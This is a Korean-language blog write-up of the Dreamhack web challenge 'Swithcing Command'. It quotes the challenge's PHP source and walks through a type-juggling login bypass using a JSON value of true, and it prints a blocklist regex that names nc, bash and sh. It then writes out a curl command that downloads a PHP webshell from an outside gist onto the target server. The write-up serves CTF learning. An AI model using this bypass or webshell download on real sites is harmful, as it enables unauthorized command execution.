---
layout: single
title: "[Dreamhack] Swithcing Command write-up"
date: 2025-05-18 15:44 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## [Dreamhack] Swithcing Command

<br>

### 문제 설명

- Not Friendly service... Can you switching the command?

<br>

### 풀이

문제 사이트에 접속해보면 Username을 입력하는 폼이 존재한다.

![image-20250517182852402](/images/2025-05-17-Swithing-command/image-20250517182852402.png)

<br>

소스 코드 중에 init.sql 부터 살펴보면 users 테이블이 존재하면 먼저 삭제하고 id,username, password 컬럼 값을 가지는 테이블을 만든다. 그 후 INSERT 문으로 username이 admin인 데이터를 집어넣고 있다.

```sql
SET NAMES utf8;

DROP TABLE IF EXISTS `users`;
CREATE TABLE users (
  idx int auto_increment primary key,
  username varchar(30) not null,
  password varchar(100) not null
);

INSERT INTO users (username, password) values ('admin', '***REDACTED***');
```

<br>

php 파일은 총 config.php, index.php, test.php, config/db_config.php 파일이 존재한다. index.php 파일을 먼저 보면 상단에 include를 이용해 config.php 파일을 불러와 에러를 표시하지 않고, 세션을 시작하고 있다. 다음으로 db_config.php에서 dreamhack 데이터베이스에 연결하는 것을 알 수 있다.

```php
# index.php
<?php
include ("./config.php");
include("./config/db_config.php");
...
  
#config.php
<?php
    ini_set('display_errors', 0);
    session_start() 
?>
      
#config/db_config.php
<?php
	$conn = mysqli_connect("db", "dreamhack", "dreamhack", "dreamhack");
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
?>
```

<br>

index.php 파일을 살펴보면, 메소드가 POST 메소드이면 data 변수에 username 파라미터로 넘어온 값을 json_decode 함수로 변환해준다. data가 존재하지 않으면 'Failed to parse JSON data' 문자열을 출력해주는 것을 알 수 있다. 또한 username 값이 admin이라면 no hack 문자의 exit 함수가 실행된다. 따라서 json_decode 함수가 수행되기 위해서는 POST로 넘겨주는 username 값이 JSON 형식이어야 한다는 것도 알 수 있다.

```php
$message = "";

if ($_SERVER["REQUEST_METHOD"]=="POST"){
    $data = json_decode($_POST["username"]);

    if ($data === null) {
        exit("Failed to parse JSON data");
    }
        
    $username = $data->username;

    if($username === "admin" ){
        exit("no hack");
    }

    switch($username){
        case "admin":
            $user = "admin";
            $password = "***REDACTED***";
            $stmt = $conn -> prepare("SELECT * FROM users WHERE username = ? AND password = ?");
            $stmt -> bind_param("ss",$user,$password);
            $stmt -> execute();
            $result = $stmt -> get_result();
            if ($result -> num_rows == 1){
                $_SESSION["auth"] = "admin";
                header("Location: test.php");
            } else {
                $message = "Something wrong...";
            }
            break;
        default:
            $_SESSION["auth"] = "guest";
            header("Location: test.php");
            
    }
}
?>
```

<br>

burp를 통해서 username 값에 JSON 형식으로 admin을 보내보면 no hack이 잘 출력되는 것을 알 수 있다.

![image-20250518143434416](/images/2025-05-17-Swithing-command/image-20250518143434416.png)

<br>

index.php의 switch 구문에서는 username 값이 admin일 때는 prepared sql 구문을 사용해서 결과 값이 1개라면 admin 세션을 설정하여 Location 헤더에 test.php를 설정하고, 1개가 아니면 message 변수에 Something wrong 를 저장한다. admin이 아닌 사용자에 대해서는 세션을 guest로 설정하고 Location헤더에 test.php로 설정하고 있다.

```php
    switch($username){
        case "admin":
            $user = "admin";
            $password = "***REDACTED***";
            $stmt = $conn -> prepare("SELECT * FROM users WHERE username = ? AND password = ?");
            $stmt -> bind_param("ss",$user,$password);
            $stmt -> execute();
            $result = $stmt -> get_result();
            if ($result -> num_rows == 1){
                $_SESSION["auth"] = "admin";
                header("Location: test.php");
            } else {
                $message = "Something wrong...";
            }
            break;
        default:
            $_SESSION["auth"] = "guest";
            header("Location: test.php");
            
    }
```

<br>

username을 아무 값인 'test'로 입력하고 테스트해보면, Location헤더에 test.php가 설정되고 auth 세션에 guest가 설정되어, test.php에서 auth 세션 값이 출력되고 있다.

![image-20250518144445536](/images/2025-05-17-Swithing-command/image-20250518144445536.png)

<br>

test.php 소스 코드를 살펴보면, pattern 변수에는 필터링 키워드가 존재하고, auth 세션이 admin이라면 GET 메소드에서 cmd 파라미터를 가져와 값이 존재하면 cmd값을 그대로 command에 저장하고, 값이 존재하지 않으면 ls로 command 변수에 저장한다. 다음으로 command 값에서 \n 이 존재하면 이를 없애고 command 값에 pattern 키워드를 정규표현식을 이용하여 필터링을 거친다. 마지막으로 escapeshellcmd 함수를 적용하여  `&`, `#`, `;`, `|`, `*`, `?`, `~`, `<`, `>`, `^`, `(`, `)`, `[`, `]`, `{`, `}`, `$`, `\`, `,`, `\`, `x0A` , `\xFF.` `"` 문자 앞에 백슬래쉬를 추가하여 커맨드 실행 값을 resulttt 변수에 저장한다. 세션이 guest라면 그냥 ehco hi guest로 result 변수에 저장한다.

```php
<?php

include ("./config.php");

$pattern = '/\b(flag|nc|netcat|bin|bash|rm|sh)\b/i';

if($_SESSION["auth"] === "admin"){

    $command = isset($_GET["cmd"]) ? $_GET["cmd"] : "ls";
    $sanitized_command = str_replace("\n","",$command);
    if (preg_match($pattern, $sanitized_command)){
        exit("No hack");
    }
    $resulttt = shell_exec(escapeshellcmd($sanitized_command));
}
else if($_SESSION["auth"]=== "guest") {

    $command = "echo hi guest";
    $result = shell_exec($command);

}

else {
    $result = "Authentication first";
}
?>
```

<br>

첫 번째로 test.php에서 원하는 명령어를 실행하기 위해서는 auth 세션 값을 admin으로 먼저 우회해야 한다. 아래 코드에서 json_decode 함수를 이용해서 === 을 통해 타입과 문자를 검사하고 있지만 username 값을 true로 설정하게 되면 no hack이 우회되고, php의 switch 문에서는 ==로 진행되기 때문에 true값이 들어가면 아래에 있는 코드가 실행되어 우회할 수 있다.
```php
if ($_SERVER["REQUEST_METHOD"]=="POST"){
    $data = json_decode($_POST["username"]);

    if ($data === null) {
        exit("Failed to parse JSON data");
    }
        
    $username = $data->username;

    if($username === "admin" ){
        exit("no hack");
    }

    switch($username){
```

![image-20250518151031280](/images/2025-05-17-Swithing-command/image-20250518151031280.png)![image-20250518151039780](/images/2025-05-17-Swithing-command/image-20250518151039780.png)

<br>

이제 test.php에서는 실행 결과 값이 reuslttt에 저장되기 때문에 실행되도 보이지가 않는다. 따라서 웹쉘을 따로 업로드해야 하는데 escapeshellcmd 함수에서는 " 더블 쿼터 문자가 쌍으로 되어있을 땐 이를 필터링하지 않으므로 curl -o 옵션을 사용해서 webshell.php 라는 파일로 업로드할 수 있다.

```bash
curl "https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php" -o webshell.php
```

![image-20250518153930241](/images/2025-05-17-Swithing-command/image-20250518153930241.png)

![image-20250518153607935](/images/2025-05-17-Swithing-command/image-20250518153607935.png)

<br>

/ 경로로 들어가서 ls 명령으로 확인해보면 flag 파일이 존재하고 /flag를 입력하면 flag가 잘 출력되는 것을 알 수 있다.

![image-20250518154115785](/images/2025-05-17-Swithing-command/image-20250518154115785.png)

![image-20250518154331747](/images/2025-05-17-Swithing-command/image-20250518154331747.png)